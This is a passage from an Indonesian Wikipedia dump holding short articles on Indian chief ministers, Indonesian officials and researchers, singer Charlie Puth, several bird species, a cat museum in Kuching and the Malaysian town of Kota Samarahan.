Jayalalithaa telah mendapatkan beberapa gelar dokterandes kehormatan dan gelar-gelar lainnya, yang dimulai dengan sebuah penghargaan dari Universitas Madras pada 1991. Pada 1972, ia diberikan penghargaan Kalaimamani oleh Pemerintahan Tamil Nadu.




</doc>
<doc id="1756638" url="https://id.wikipedia.org/wiki?curid=1756638" title="Daftar Ketua Menteri Jammu dan Kashmir">
Daftar Ketua Menteri Jammu dan Kashmir

Ketua Menteri Jammu dan Kashmir adalah ketua eksekutif di negara bagian utara India Jammu dan Kashmir. Sebelum 30 Maret 1965, ketika sebuah amendemen dari Konstitusi Jammu dan Kashmir dilaksanakan, jabatan tersebut dikenal sebagai Perdana Menteri Jammu dan Kashmir. Sebelumnya, negara bagian tersebut memilih "Wazir-e-Azam" (perdana menteri) dan "Sadr-e-Riyasat" (presiden) miliknya sendiri. Namun, pada 1965, konstitusi negara bagian tersebut diamendemenkan, dan jabatan perdana menteri dan presiden berganti nama masing-masing menjadi ketua menteri dan gubernur. Perubahan tersebut dilaksanakan pada 30 Maret 1965 ketika perdana menteri yang memerintah, Ghulam Mohammed Sadiq, diangkat sebagai ketua menteri Jammu dan Kashmir pertama.

Mehbooba Mufti dari Partai Demokratik Rakyat adalah Ketua Menteri Jammu dan Kashmir saat ini. Dilantik pada 1 Maret 2016, ia menggantikan ayahnya, Mufti Mohammad Sayeed. Ia merupakan wanita pertama yang menduduki jabatan Ketua Menteri Jammu dan Kashmir.



</doc>
<doc id="1756909" url="https://id.wikipedia.org/wiki?curid=1756909" title="Triyono Budi Sasongko">
Triyono Budi Sasongko

Drs. Triyono Budi Sasongko, M.Si () adalah Penjabat Gubernur Kalimantan Utara sejak 22 April 2015 hingga 12 Februari 2016. Ia dilantik oleh Menteri Dalam Negeri Tjahjo Kumolo menjadi Penjabat Gubernur menggantikan Irianto Lambrie pada 22 April 2015

Anak: Dyah Hayuning Pratiwi (Jakarta, 11 April 1987)

Dyah Handayani Nastiti (Jakarta, 22 September 1991, anggota DPRD Banyumas/Fak Kedokteran Unsoed)

Lintang Putra Perwira (Purbalingga, 4 Februari 2004)Triyono Budi Sasongko (Triyono BS atau akrab disapa TBS) merupakan anak ketiga dari pasangan Sosrodiharjo (Alm) dan Ny. Soetarni. Saudara Triyoono berjumlah delapan orang, yakni Bambang Eko Budi Utomo (Purbaingga, 10 September 1982, wiraswasta), Dr Hendro Budi Hartono (Purbalingga, 25 Februari 1954, PNS), Dra Endah Budi Lukito (Purbalingga, 17 Januari 1958, PNS), Ambar Budi Yuwono (Purbalingga, 23 Oktober 1959, pengusaha/anggota DPRD Purbalingga), Singgih Budi Susilo, BE (Purbalingga, 26 Maret 1961, wiraswasta), Ir. Wahyu Budi Saptono, M.Si (Purbalingga, 16 Januari 1964, PNS/Sekda Banyumas), Retno Budi Astuti, BA (Purbalingga, 27 Desember 1967, ibu rumah tangga), dan Dra Esti Budi Lestari (Purbalingga, 17 Oktober 1969, PNS).

Semasa kecil, Triyono Budi Sasongko sekolah di SD Kristen Purbalingga (sekarang bernama SD Bina Harapan-di bawah Yayasan Bina Harapan Purbalingga) , tamat tahun 1969, lalu masuk ke SMP Negeri 1 Purbalingga, tamat 1972. Setamat SMP Negeri 1 Purbalingga Triyono BS melanjutkan ke SMA Negeri 1 Purbalingga, tamat 1975. Ketika menginjak kelas dua SMA, saat penjurusan Triyono masuk ke jurusan IPA. Tetapi merasa tidak cocok di jurusan IPA, ia pindah jurusan IPS. Keinginanya itu ditentang ayahnya, namun walau ditentang ia tetap pindah jurusan karena yakin IPA bukan dunianya. Setelah lulus SMA Triyono diterima di Fakultas Ekonomi Unsoed, Purwokerto; Fakultas Hukum UGM ; Fakultas Sospol Undip. Tri memilih Fakultas Sospol Undip (Jurusan Administrasi Negara). Sebenarnya, ayahnya mengharapkan kuliah di Fakultas Ekonomi Unsoed. Meski ditentang ayahnya, Triyono tetap nekat masuk di Fakultas Sospol Undip. Merasa banyak waktu luang Tri memutuskan mendaftar kuliah di Fakultas Hukum dan lmu Kemasyarakatan Unissula tanpa sepengetahuan ayahnya, walau akhirnya ayahnya tau. Di Unisula Triyono tamat sarjana muda tahun 1980. Sedangkan dari Undip ia menamatkan sarjananya tahun 1981. Ia juga menyelesaikan pendidikan S-2 di Universitas Satyagama, Jakarta tahun 2002, di program studi Magister Ilmu Pemerintahan.

Setelah menyelesaikan kuliahnya di Undip Tri bekerja di Departemen Pertanian Pusat pada tahun 1981. Karena diterima langsung menjadi CPNS dan bekerja di Jakarta ia meninggalkan kuliahnya di Unissula. Satu tahun bekerja di Departemen Pertanian Tri pindah ke Departemen Dalam Negeri.

22 Maret 2000 Tri dilantik sebagai bupati Purbalingga periode 2000 – 2005 & 2005 - 2010. Tri adalah sosok pemimpin yang mendengar dan menyerap aspirasi rakyat. Tri melakukan upaya untuk meningkatkan kesejaheraan rakyat dengan pengetasan kemiskinan. Ia melakukan pembagian beras jatah PNS yang berasal dari petani Purbalingga. Sehingga beras petani tidak dibeli lintah darat. Ia juga memperhaikan komoditas pertanian lainya. Berkat kebijakan- kebijakanya ia memperoleh Penghargaan Pengembangan Ketahanan Pangan Tahun 2003 untuk Kelembagaan Kabupaten oleh Kepala Badan Bimbingan Masal Ketahanan Pangan Provinsi Jawa Tengah. Dalam hal pendidikan ia mengutamakan wajib belajar sembilan tahun. Dalam hal kesehatan ia menciptakan program JPKM ( Jaminan Pemeliharaan Kesehatan Masyarakat ). Di bidang perekonomian ia membangun dan merenovasi sarana - sarana pemasaran.

Selain itu Bupati Purbalingga ini juga berjasa berkat tindakannya merenovasi dan menata alun - alun Purbalingga sehingga menjadi ramai dikunjungi warga. Ia membangun perpustakaan umum dan museum “ Prof. Dr. R. Soegarda Poerbawakatja “ di dekat alun - alun. Serta merenovasi Masjid Agung Darussalam sehingga bergaya Jawa dan masjid Nabawi.Ia menjadi ketua APKASI ( Asosiasi Pemerintah Kabupaten Seluruh Indonesia) wilayah Jawa Tengah pada tahun 2006 . Ia juga ditunjuk sebagai board exsecutif Partnership Goverment Reform in Indonesia pada tahun 2006 juga.

Tahun 2015, Ia ditunjuk untuk menjadi Pj. Gubernur Kalimantan Utara ke-2 menggantikan Irianto Lambrie


</doc>
<doc id="1756920" url="https://id.wikipedia.org/wiki?curid=1756920" title="Bungie">
Bungie

Bungie adalah sebuah Kemukiman dalam Kecamatan Simpang Tiga, Kabupaten Pidie, Provinsi Aceh.
Kemukiman Bungie terdiri dari empat (4) Desa, yakni Desa Raya Paya atau lazim disebut Teurbue Bungie, Desa Mesjid Bungie, Desa Liliep Bungie dan Desa Ujong Baroh.

</doc>
<doc id="1756921" url="https://id.wikipedia.org/wiki?curid=1756921" title="Charlie Puth">
Charlie Puth

Charles Otto Puth Jr. () () adalah seorang penyanyi, penulis lagu dan produser rekaman berkebangsaan Amerika Serikat. Lagu debutnya "See You Again", yang dia tulis, ikut produseri, dan nyanyikan bersama Wiz Khalifa untuk lagu latar "Furious 7" sebagai penghormatan terhadap Paul Walker, berada di nomor satu selama 12 minggu tidak berurutan di Amerika Serikat.

Kesuksesan awal Puth datang melalui keberhasilan viral dari video lagunya yang diunggah ke YouTube. Setelah sukses "See You Again", dia kemudian mendapatkan perhatian yang lebih luas untuk beberapa single yang rilis berikutnya, termasuk single debutnya "Marvin Gaye", yang dia nyanyikan bersama Meghan Trainor. Lagu ini memuncaki tangga lagu di Selandia Baru, Irlandia, dan Britania Raya.

Debut album studio Puth, "Nine Track Mind", dirilis pada Januari 2016, dan menghasilkan single One Call Away" dan "We Don't Talk Anymore", yang berada di nomor 12 dan nomor 9 masing-masing di "Billboard" Hot 100 AS. Pada tahun 2017, dia merilis dua lagu, "Attention" dan "How Long" dari album studio keduanya, "Voicenotes", yang mana "Attention" berada dinomor lima di "Billboard" Hot 100.

Charles Otto Puth Jr lahir pada tanggal 2 Desember 1991, di Rumson, New Jersey, putra dari Debra, seorang guru musik yang juga menulis iklan untuk HBO, dan Charles Puth, seorang pembangun dan agen real estate. Ayahnya adalah seorang Katolik dan ibunya adalah seorang Yahudi. Dia memiliki adik kembar, Stephen dan Mikaela.

Ketika berusia dua tahun, alis kanan Puth secara permanen terluka dalam insiden gigitan anjing yang hampir fatal.

Puth memiliki Absolute pitch, sebuah fenomena pendengaran langka yang memungkinkannya untuk mengidentifikasi atau menciptakan musik, tanpa referensi nada. Ibunya mengenalkannya pada musik klasik dan mulai mengajarinya piano pada usia 4 tahun. Dia mulai belajar jazz pada usia 10 tahun dan berpartisipasi dalam ansambel jazz pemuda musim panas di Count Basie Theatre's Cool School di Red Bank, New Jersey di usia 12 tahun. Dia dipekerjakan oleh Count Basie Theater untuk bermain dalam produksi Charlie Brown. Pada saat kelas enam, dia datang dari pintu ke pintu untuk menjual sebuah album Natal berjudul " Have a Merry Charlie Christmas " yang telah dia rekam dan dia hasilkan, menghasilkan $600 dalam penjualannya.

Dia memasuki Holy Cross School, di Rumson, dan Forrestdale Middle School, sebelum lulus dari Rumson-Fair Haven Regional High School pada tahun 2010. Selama kelas ketujuhnya dari tahun-tahun terakhirnya, dia memasuki Manhattan School of Music Pre-College sebagai mayor piano jazz dan pelajaran minor klasik. Puth lulus pada tahun 2013 dari Berklee College of Music, di mana dia mengambil jurusan produksi dan teknik musik.

Pada bulan September 2009, dia memulai saluran YouTube sendiri, yang berjudul "Charlies Vlogs", mengunggah video komedi dan cover akustik. Pada tahun 2010, Puth merilis video musik dari lagu pertamanya, "This Are My Sexy Shades". Pada bulan Desember 2010, dia merilis debut extended playnya, "The Otto Tunes", yang dirilis secara independen. Pada tahun 2011, dia memenangkan sebuah kompetisi video online yang disponsori oleh Perez Hilton, "Can You Sing", dengan versi Adele "Someone Like You" yang dia nyanyikan bersama Emily Luther. Pada tahun yang sama Ellen DeGeneres mengumumkan bahwa dia telah mengontrak Puth dan Luther ke labelnya, eleveneleven, setelah melihat penampilan mereka membawakan lagu Adele "Someone Like You". Puth telah membawakan lagu itu di acaranya. Pada bulan Desember 2012 dia merilis sebuah single promosi, "Break Again", dengan vokal tambahan oleh Emily Luther. Video musiknya telah dirilis beberapa hari kemudian. Pada tanggal 25 Januari 2012, Puth dan Luther membawakan lagu tersebut dan lagu Lady Antebellum "Need You Now" di "The Ellen DeGeneres Show". Puth juga tampil di acara yang mendukung DKMS Delete Blood Cancer, pusat donor sumsum terbesar di dunia, pada bulan Oktober 2012. Puth keluar dari eleveneleven pada akhir 2012.

Pada tanggal 23 Oktober 2013, dia merilis extended play independen keduanya, "Ego", di aplikasi putar daring. Puth dikreditkan dalam produksi dan penulisan lagu dan jingle untuk sesama Youtuber. Dia menulis lagu tema untuk Shane Dawson podcast dan sandiwara Shane and Friends, intro jingle untuk video keluarga Vlogger SHAYTARDS, lagu tema asli untuk vampir Charles Trippy "Internet Killed Television", dan sebuah lagu untuk tur dan film dari grup YouTube Our 2nd Life, serta beberapa single untuk anggota 2nd Our Life Ricky Dillon. Pada tahun 2014 ia merilis single promosi "L.U.V.". Video musiknya diarahkan oleh Andrew Vallentine. Pada tahun yang sama, dia turut menulis lagu "Celebrate" di album studio kedelapan Pitbull "Globalization".

Pada awal 2015, Puth menandatangani kontrak dengan Atlantic dan rekaman sebelumnya telah dihapus dari iTunes. Pada bulan Februari 2015, Puth merilis single debutnya "Marvin Gaye", yang menampilkan vokal tamu dari Meghan Trainor. Single ini telah mendapatkan sertifikat Platinum 2× di Australia, menduduki puncak tangga lagu di Selandia Baru, Irlandia, dan Inggris, dan memuncak di nomor 21 di " Billboard " Hot 100 AS. Puth menulis, ikut memproduksi, dan ikut bernyanyi di sebuah lagu dengan Wiz Khalifa, "See You Again", penghormatan kepada almarhum Paul Walker, yang masuk dalam lagu latar "Furious 7". Sementara Khalifa menulis lirik rap, sisa lagunya telah dikreditkan ke Puth. Lagu tersebut memuncak di nomor satu di chart Hot 100 selama 12 minggu berturut-turut. "See You Again" dinominasikan untuk tiga Grammy Awards: Song of the Year, Best Pop Duo/Group Performance dan Best Song Written for Visual Media. Lagu ini juga terpilih sebagai Song of the Year untuk BBC Music Awards dan dinominasikan untuk Golden Globe Award untuk Best Original Song di 73th Golden Globe Awards. Dia menghasilkan lagu "Slow Motion" untuk Trey Songz dan telah mengatur sesi dengan Jason Derulo dan Lil Wayne.

Puth membintangi video musik "Dear Future Husband" Meghan Trainor. Pada tanggal 1 Mei 2015, Puth merilis sebuah extended play berisi lima lagu, "Some Type of Love". Pada bulan Juni 2015, dia merilis single promosi "Nothing but Trouble" dengan Lil Wayne, dari soundtrack untuk film dokumenter "808: The Movie". Selama tahun 2015, Puth mengerjakan beberapa album dari artis lain. Dia turut menulis dan memproduksi "Broke" dan "Pull Up" untuk album Jason Derulo "Everything Is 4", ikut menulis "Bombastic" dengan Bonnie McKee dari albumnya "Bonnie McKee", dan menghasilkan "Working Class Heroes (Work)" di album CeeLo Green "Heart Blanche".

Pra-pemesanan untuk album debut studio Puth "Nine Track Mind" dimulai pada tanggal 20 Agustus 2015, bersamaan dengan single keduanya "One Call Away". Lagu tersebut memuncak di nomor 12 di Amerika Serikat, 26 di Inggris dan 4 di Australia. Pada bulan Februari 2016, lagu tersebut telah terjual 513,700 kopi di dalam negeri. Puth merilis remix untuk lagu yang berjudul "One Call Away (Coast to Coast Mix)", yang menampilkan rapper Amerika Tyga dan Ty Dolla Sign, artis rekaman country Brett Eldredge dan penyanyi Meksiko Sofia Reyes.

Album debutnya, "Nine Track Mind", dirilis pada tanggal 29 Januari 2016. Album ini debut di nomor tiga di Inggris. Album ini sendiri memuncak di nomor 6 di " Billboard " 200, menerima skor 37 dari 100 di Metacritic, menjadi album ke-15 terburuk yang dinilai di situs ini. Puth memulai debut konsernya, Nine Track Mind Tour, pada bulan Maret 2016.

Pada tahun 2016, Puth adalah musisi pertama yang menandatangani kontrak dengan Deutsch Music.

Pada tanggal 21 April 2017, Puth merilis single utama, "Attention", dari album studio keduanya, "Voicenotes", yang rilis pada tanggal 11 Mei 2018. Single kedua dari "Voicenotes", "How Long", dirilis pada tanggal 5 Oktober 2017.

Puth juga berkolaborasi dengan anggota One Direction Liam Payne di single "Bedroom Floor", yang dia ikut produseri dan ikut menyumbangkan vokal latar. Pada tahun 2018, dia menjadi fitur disingle G-Eazy berjudul "Sober".

Pada tanggal 4 Januari 2018, Puth merilis single promosi pertama "If You Leave Me Now" yang fitur bersama Boyz II Men. Puth menyatakan dalam sebuah cuitannya bahwa dia akan menunda tanggal rilis albumnya menjadi tanggal 11 Mei 2018, dari tanggal awalnya pada tanggal 19 Januari 2018. Puth mengadakan Voicenotes Tour pada tahun 2018, bersama Hailee Steinfeld sebagai tamu ditanggal terpilih.

Pada tanggal 15 Maret 2018, "Done for Me" dirilis sebagai single ketiga dari "Voicenotes". Lagu ini fitur dengan penyanyi Kehlani. Pada tanggal 25 Maret 2018, Puth merilis single keempat "Change" bersama James Taylor.. Sehari sebelumnya, Puth menyanyikan lagu itu diacara March for Our Lives di Los Angeles. Album ini juga menghasilkan lagu "The Way I Am" dan "Patient".


Headlining

Co-headlining

Supporting


</doc>
<doc id="1756922" url="https://id.wikipedia.org/wiki?curid=1756922" title="I Wayan Surpha">
I Wayan Surpha

I Wayan Surpha, SH merupakan salah satu anggota Tokoh Adat dan Agama Umat Hindu di Bali sekaligus sebagai mantan sekjen Parisada Hindu Dharma dan Kapten Polisi (purn).I Wayan Surpha lahir pada tanggal 1 Mei 1935 di Denpasar.

</doc>
<doc id="1756927" url="https://id.wikipedia.org/wiki?curid=1756927" title="Mandar bakau">
Mandar bakau

Mandar bakau ("Eulabeornis castaneoventris") adalah sebuah spesies burung dalam keluarga Rallidae. Hewan tersebut adalah satu-satunya spesies dalam genus Eulabeornis.

Hewan tersebut ditemukan di Australia dan Indonesia.
Habitat alaminya adalah hutan-hutan mangrove subtropis atau tropis.



</doc>
<doc id="1756930" url="https://id.wikipedia.org/wiki?curid=1756930" title="Ags. Arya Dipayana">
Ags. Arya Dipayana

Agung Setiadji bin Darjono Hadjiwidjojo atau lebih populer dengan nama Ags. Arya Dipayana () adalah seniman berkebangsaan Indonesia. Namanya dikenal sebagai seniman teater, penyair sekaligus penulis cerita pendek yang mempublikasikan karyanya di berbagai media massa. Ags. Arya Dipayana merupakan salah satu penerima Hibah Seni dari Yayasan Kelola.

Ags. Arya Dipayana lahir di Tulungagung, Jawa Timur, 29 April 1961. Mulai berkesenian sejak di bangku sekolah lanjutan dengan menulis cerita-cerita pendek dan puisi. Menyelesaikan pendidikannya di Fakultas Sastra Universitas Indonesia jurusan Sastra Prancis. Sempat bekerja sebagai redaktur tamu di majalah "Hai" dan "Zaman", dan copywriter di beberapa biro iklan. Karya-karyanya kemudian dipublikasikan di berbagai media, seperti "Majalah Hai, Suara Pembaruan, Zaman, Majalah Matra" dan banyak lagi. Tahun 1976 mulai aktif di dunia teater, mendirikan Teater Egg (sekarang Teater Tetas) pada tahun 1978. Sejak 1985 aktif menulis naskah drama untuk kepentingan pertunjukan. Kumpulan puisinya yang pernah terbit adalah "Sajak Pejalan Kaki, Tiga Cermin Kecil (Kumpulan Bertiga)", dan "Sehingga Kabut (Kumpulan Tunggal)". Beberapa puisinya dijadikan lagu antara lain oleh Dwiki Dharmawan, dinyanyikan oleh Novia Kolopaking, Reda Gaudiamo, dan lain-lain.

Dia juga aktif menyutradarai pementasan-pementasan Teater Tetas. Naskah-naskah drama yang ditulisnya diantaranya "Wisanggeni Berkelebat, Seorang Anak Menangis, Palaganada: Dari Negeri Cinta, Jejak Surga", dan "Julung Sungsang dan Raung Kuda Piatu" (2009). Ags. Arya Dipayana meninggal pada 1 Maret 2011, sekitar pukul 22.30 WIB, saat memberikan lokakarya teater di Purwakarta, Jawa Barat. Jenazah dimakamkan keesokan harinya di TPU Jeruk Purut, Jakarta Selatan.





</doc>
<doc id="1756935" url="https://id.wikipedia.org/wiki?curid=1756935" title="Amaurornis moluccana">
Amaurornis moluccana

Amaurornis moluccana adalah sebuah spesies burung dalam keluarga Rallidae.

Hewan tersebut ditemukan di Indonesia, Papua Nugini, Australia dan Kepulauan Solomon.
Habitat alaminya adalah hutan dataran rendah berlumpur subtropis atau tropis.



</doc>
<doc id="1756936" url="https://id.wikipedia.org/wiki?curid=1756936" title="Sus scrofa vittatus">
Sus scrofa vittatus

Sus scrofa vittatus adalah sebuah subspesies dari babi hutan. Hewan tersebut berasal dari Semenanjung Thai-Malaya dan beberapa pulau Indonesia, yakni Sumatra, Jawa, dan Kepulauan Sunda Kecil serta Komodo.



</doc>
<doc id="1756940" url="https://id.wikipedia.org/wiki?curid=1756940" title="Gerlof Fokko Mees">
Gerlof Fokko Mees

Dr Gerlof Fokko Mees (16 Juni 1926 - 31 Maret 2013) adalah seorang iktiolog, ornitolog dan kurator museum Belanda. Pada 1946 sampai 1949, ia mengambil bagian sebagai conscript dalam tindakan-tindakan militer untuk mendirikan kembali pemerintahan Hindia Belanda. Pada waktu itu, ia mempelajari keluarga hewan terbang Zosteropidae.

Mees lahir di Velsen, Belanda. Ia masuk Universitas Leiden dimana ia mempelajari biologi, mendapatkan gelar dokterandesnya pada 1956. Ianmenjadi asisten departemen burung Rijksmuseum van Natuurlijke Historie di Leiden dari Mei 1955 sampai Juni 1957. Setelah itu, ia menjadi Kurator Vertebrata di Museum Australia Barat dari 1958 sampai 1963. Ia kemudian kembali ke Belanda untuk menjadi Kurator Burung di Rijksmuseum di Leiden sampai ia pensiun, dimana ia kembali ke Australia Barat pada 1991, dan tinggal di Perth dan Northcliffe. Ia meninggal di Busselton, Australia Barat.

Ia memberikan deskripsi pertama dari spesies iklan yang tak lazim, ikan Salamander Australia Barat.

Nightjar Mees, nama yang digunakan untuk menyebut spesies baru "Caprimulgus meesi", dinamai dari nama peneliti tersebut.



</doc>
<doc id="1756941" url="https://id.wikipedia.org/wiki?curid=1756941" title="Fitriya Nur Annisa Dewi">
Fitriya Nur Annisa Dewi

Drh. Fitriya Nur Annisa Dewi, PhD adalah seorang peneliti asal Indonesia yang bekerja di Pusat Studi Satwa Primata Institut Pertanian Bogor. Ia mulai dikenal sejak menemukan obat anti kanker payudara berbahan dasar daun katuk ("Sauropus androgynus").



</doc>
<doc id="1756942" url="https://id.wikipedia.org/wiki?curid=1756942" title="Storrs Olson">
Storrs Olson

Storrs Lovejoy Olson (kelahiran 3 April 1944 di Chicago, Illinois) adalah seorang ahli biologi dan ornitologi Amerika dari Institusi Smithsonian. Ia adalah salah satu paleontolog terkenal di dunia.
Ia mendapatkan gelar BSc dalam bidang biologi pada 1965 dan gelar DSc dalam bidang paleornitologi pada 1969, di fakultas biologi Universitas Johns Hopkins.

Olson adalah penerima 1994 dari Penghargaan Penelitian Loye dan Alden Miller. Ia awalnya adalah kurator burung di Museum Sejarah Alam Nasional Amerika Serikat; , ia memegang jabatan emeritus di institusi tersebut.

Beberapa spesies burung pra-sejarah dinmai dari nama Storrs Olson, yakni "Nycticorax olsoni", "Himantopus olsoni", "Puffinus olsoni" "Primobucco olsoni", "Gallirallus storrsolsoni", dan "Quercypodargus olsoni".



</doc>
<doc id="1756945" url="https://id.wikipedia.org/wiki?curid=1756945" title="Amaurornis">
Amaurornis

Amaurornis adalah sebuah genus burung dalam keluarga Rallidae. Nama tersebut berasal dari kata Yunani "amauros", yang artinya "kehitam-hitaman" atau "cokelat" dan "ornis", yang artinya "burung".

Genur tersebut terdiri dari spesies-spesies berikut ini:


</doc>
<doc id="1757109" url="https://id.wikipedia.org/wiki?curid=1757109" title="Laxmikant Parsekar">
Laxmikant Parsekar

Laxmikant Yashwant Parsekar (kelahiran 4 Juli 1956) adalah seorang politikus India yang menjadi Ketua Menteri Goa, sebuah negara bagian di India, sejak 2014. Ia adalah anggote Mahkamah Legislatif Goa dari konstituensi Mandrem, dan ia berasal dari Partai Bharatiya Janata.

Ia dilantik menjadi Ketua Menteri Goa pada 8 November 2014, menggantikan Manohar Parrikar.

Laxmikant Parsekar lahir pada 4 Juli 1956 di desa Harmal, Pernem taluk, Goa. Ia mendapatkan gelar M.Sc (1980) dan B.Ed (1981) dari Pusat Insktruksi & Penelitian Pasca Kelulusan, Panaji, Goa, (kemudain Universitas Bombay). Ia adalah kepala sekolah dari Sekolah Menengah Harmal Panchakroshi, Harmal, Goa.

Ia menjabat sebagai Menteri Kesehatan Goa sebelum menjadi Ketua Menteri dan memiliki hubungan yang kuat dengan Rashtriya Swayamsevak Sangh.


</doc>
<doc id="1757114" url="https://id.wikipedia.org/wiki?curid=1757114" title="Anto Wijaya">
Anto Wijaya

Anto Wijaya () adalah seorang Aktor laga Indonesia yang sering membintangi serial kolosal era 90-an sampai awal 2000-an.Badannya yang tinggi tegap dianggap pantas untuk memerankan Brama Kumbara di sinetron laga kolosal Singgasana Brama Kumbara. Ia juga dikenal dalam perannya di Tutur Tinular sebagai Arya Kamandanu & Angling Dharma di Serial Angling Dharma

Anto Wijaya sendiri sebenarnya tak punya basic bela diri. Pria asli Surabaya yang lahir 10 November 1969 ini malah mengawali kariernya sebagai model. Bermula dengan mengikuti sebuah kelompok model di kota pahlawan hingga akhirnya ia mampu menjamah Jakarta.

The Best Model Pageant yang pernah dimenangkannya tahun 1991 menjadi modal untuknya bermain dalam film dan sinetron. Roman mukanya tersebut cocok dengan image seorang raja atau pendekar yang penuh dengan wibawa tersebut dianggap cocok untuk berperan dalam Film laga.



</doc>
<doc id="1757115" url="https://id.wikipedia.org/wiki?curid=1757115" title="Nanik Purwanti">
Nanik Purwanti

Dr. Nanik Purwanti, S.TP, M.Sc, adalah seorang peneliti berkebangsaan Indonesia yang bekerja sebagai staf pengajar di Departemen Teknik Mesin dan Biosistem Institut Pertanian Bogor. Ia merupakan penerima penghargaan National Fellowship L'Oreal-UNESCO For Women in Science pada tahun 2014 atas hasil karyanya yang berjudul "Pengembangan Mikrokapsul dengan Protein Nanofibrils Menggunakan Proses Absorsi Layer-by-layer Untuk Diterapkan Sebagai Perangkat Pelepasan Terkendali".


</doc>
<doc id="1757120" url="https://id.wikipedia.org/wiki?curid=1757120" title="Manik Sarkar">
Manik Sarkar

Manik Sarkar ( Pengucapan Bengali "Manik Shôrkar"; kelahiran 22 Januari 1949) adalah seorang poltikus India yang menjadi Ketua Menteri Tripura sejak Maret 1998. Ia adalah Anggota Politburo dari Partai Komunis India (Marxis). Pada Maret 2008, ia dilantik sebagai pemimpin Front Kiri, pemerintahan koalisi Tripura. Dalam pemilihan mahkamah yang diadakan pada 2013, ia menjadi ketua menteri untuk keempat kalinya.

Manik Sarkar lahir dalam sebuah keluarga kelas menengah di Bangladesh, pada 22 Januari 1949. Ayahnya, Amulya Sarkar, belerja sebagai penjahit, sementara ibunya, Anjali Sarkar, merupakan seorang karyawan pemerintahan Negara Bagian dan kemudian Provinsi. Sarkar menjadi aktif dalam gerakan-gerakan pelajar pada hari-hari pelajarnya, dan pada 1968, pada usia 19 tahun, ia menjadi anggota salah satu anggota partai politik utama India, Partai Komunis Marxis. Ia menjadi kandidat dari Federasi Pelajar India pada kehidupan akademiknya di Kolese MBB, di mana dari sana ia lulus dengan gelar B. Com.

Manik Sarkar menikah dengan Panchali Bhattacharya, yang pensiun dari Badan Kesejahteraan Sosial Pusat pada 2011. Sarkar dan istrinya hidup sangat sederhana. Ia adalah satu-satunya Ketua Menteri di India yang tidak memiliki rumah atau sebuah mobil atas namanya. Istrinya pernah menggunakan sebuah bajaj ketika berjalan-jalan, dengan tanpa penjaga keamanan pribadi.


</doc>
<doc id="1757130" url="https://id.wikipedia.org/wiki?curid=1757130" title="Fun! Fun! Fanfare!">
Fun! Fun! Fanfare!

Fun! Fun! Fanfare! (digayakan sebagai FUN! FUN! FANFARE!) adalah album ketujuh dari band pop-rock Jepang Ikimono-gakari. Dirilis pada 24 Desember 2014, dan meraih posisi pertama di Oricon Albums Chart.


</doc>
<doc id="1757131" url="https://id.wikipedia.org/wiki?curid=1757131" title="Museum Kucing, Kuching">
Museum Kucing, Kuching

Museum Kucing adalah sebuah museum kucing di Kuching, Sarawak, Malaysia. Museum tersebut didirikan pada 1993. Museum tersebut dimiliki oleh Dewan Bandaraya Kuching Utara (DBKU).

Gagasan pembangunan sebuah museum kucing berasal dari ketua menteri Sarawak Abdul Taib Mahmud dan istrinya Laila Taib.

Terdapat empat galeri yang berisi lebih dari 4,000 artefak yang meliputi lukisan-lukisan dan peringatan-peringatan yang dikaitkan dengan kucing. Artefak-artefak tersebut diakuisisikan dari Museum Nasional di Kuala Lumpur dan disimpan untuk pertama kalinya pada 1 Agustus 1988 di Dewan Tun Abdul Razak, Pusat Perdagangan Dunia Putra. Koleksi-koleksi tersebut berpindah tangan ke DBKU setelah markas besar DBKU selesai dibangun pada 1992.

Museum tersebut sekarang berada di dalam markas besar DBKU. Museum tersebut melingkupi wilayah seluas 1,035 meter persegi di atas Bukit Siol yang berada di ketinggian 60 meter di atas permukaan laut.



</doc>
<doc id="1757136" url="https://id.wikipedia.org/wiki?curid=1757136" title="Daftar Ketua Menteri Goa">
Daftar Ketua Menteri Goa

Ketua Menteri Goa adalah ketua eksekutif negara bagian pesisir India selatan Goa. Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, namun otoritas eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan-pemilihan dari Mahkamah Legislatif Goa, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Setelah aneksasi India atas Goa 1961, bekas koloni Portugis tersebut menjadi bagian dari wilayah persatuan Goa, Daman dan Diu. Pada 1987, Goa mendapatkan status negara bagian secara penuh, sementara Daman dan Diu menjadi sebuah wilayah persatuan yang terpisah. Sejak 1963, sebelas orang menjabat sebagai Ketua Menteri wilayah persatuan Goa, Daman dan Diu dan negara bagian Goa. Yang pertama adalah Dayanand Bandodkar dari Partai Maharashtrawadi Gomantak, yang digantikan oleh putrinya Shashikala Kakodkar, satu-satunya ketua menteri wanita di Goa. Pratapsingh Rane dari Kongres Nasional India, yang saat memerintah Goa mendapatkan status negara bagian, adalah pemegang jabatan yang menjabat terlama.

Ketua menteri petahana-nya adalah Laxmikant Parsekar dari Partai Bharatiya Janata, yang dilantik pada 8 November 2014 setelah Manohar Parrikar mengundurkan diri dari jabatan tersebut untuk berpindah ke Kabinet Persatuan.




</doc>
<doc id="1757138" url="https://id.wikipedia.org/wiki?curid=1757138" title="Kota Samarahan">
Kota Samarahan

Kota Samarahan adalah kursi administratif dari "distrik Samarahan" (407.1 kilometer persegi) di Divisi Samarahan, Sarawak, timur Malaysia. Kota tersebut berjarak sekitar 30 kilometer dari Kuching. Jumlah penduduk distriknya (sensus tahun 2010) adalah 87,923 orang. Kota Samarahan adalah tempat pendidikan utama di Negara Bagian Sarawak dan secara resmi dikenal sebagai ""Kota Pengetahuan"".

Kota Samarahan sesekali dikenal sebagai Muara Tuang yang pada waktu itu adalah sebuah desa perdagangan kecil di wilayah tersebut. Desa tersebut terhubung dengan Kuching melalui satu-satunya sebuah jalan pada awal 1970an. Sebelum itu, satu-satunya jalan transportasi menuju desa tersebut adalah melalui sebuah sungai.
Pengembangan di desa kecil tersebut diwujudkan dengan pembangunan jalan yang berjarak 25 kilometer yang menghubungkan Kota Samarahan dengan Kuching.


</doc>
<doc id="1757146" url="https://id.wikipedia.org/wiki?curid=1757146" title="Bani Hawazin">
Bani Hawazin

